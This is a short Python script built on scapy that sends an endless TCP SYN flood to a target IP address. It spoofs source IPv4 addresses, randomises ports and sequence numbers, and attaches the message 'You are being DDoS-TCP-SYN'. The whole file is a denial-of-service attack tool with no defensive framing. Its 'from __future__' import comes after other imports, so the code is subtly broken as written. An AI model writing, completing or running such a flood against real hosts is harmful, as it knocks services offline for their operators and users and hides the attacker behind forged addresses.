from scapy.all import *
from rport import *
from __future__ import print_function
ttl = 99
id = 1111
dport = [80]
message = b'You are being DDoS-TCP-SYN'
def TCP_SYN(ip):
	while 1:
		sport = randomize_port()
		ipv4 = spoof_ipv4()
		#src=ipv4,
		packet = IP(src=ipv4,dst=ip,id=id,ttl=ttl)/TCP(sport=sport,dport=dport,seq=random_seq(),ack=random_seq(),window=random_seq(),flags='S')/message
		send(packet,verbose=0)
		#print(packet.show())

#TCP_SYN("169.254.7.233")